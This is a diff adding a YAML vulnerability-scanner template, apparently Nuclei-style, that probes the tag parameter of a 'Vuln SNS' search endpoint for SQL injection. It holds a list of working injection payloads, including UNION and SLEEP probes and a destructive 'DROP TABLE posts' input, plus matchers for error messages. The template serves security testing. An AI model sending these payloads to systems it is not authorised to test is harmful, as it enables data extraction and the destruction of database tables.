@@ -1,0 +1,68 @@
+id: vuln-sns-search-sql-injection
+info:
+  name: Vuln SNS Search - SQL Injection
+  author: claude
+  severity: critical
+  description: |
+    Tests for SQL injection vulnerabilities in the search endpoint's tag parameter.
+    Successful exploitation could lead to data extraction or database manipulation.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: vuln-sns,sqli,search,critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/search?tag={{payload}}"
+
+    payloads:
+      payload:
+        - "test' OR '1'='1"
+        - "test' OR '1'='1' --"
+        - "test' OR '1'='1' #"
+        - "test' UNION SELECT null,null,null --"
+        - "test' AND SLEEP(5) --"
+        - "test'; DROP TABLE posts; --"
+        - "test' ORDER BY 10 --"
+        - "test' AND 1=2 UNION SELECT @@version,null,null --"
+        - "test' AND EXISTS(SELECT * FROM information_schema.tables) --"
+        - "test%27+OR+%271%27%3D%271"
+        - "test\\' OR \\'1\\'=\\'1"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql error"
+          - "syntax error"
+          - "MySQLSyntaxErrorException"
+          - "You have an error in your SQL syntax"
+        condition: or
+        part: body
+
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+        condition: and
+
+      - type: regex
+        regex:
+          - '@@version'
+          - 'information_schema'
+          - 'UNION.*SELECT'
+        condition: or
+        part: body
+
+      - type: status
+        status:
+          - 500
+
+    extractors:
+      - type: regex
+        name: sql_error
+        regex:
+          - 'SQL.*error.*:.*'
+          - 'MySQL.*Error.*[0-9]+'
+        part: body
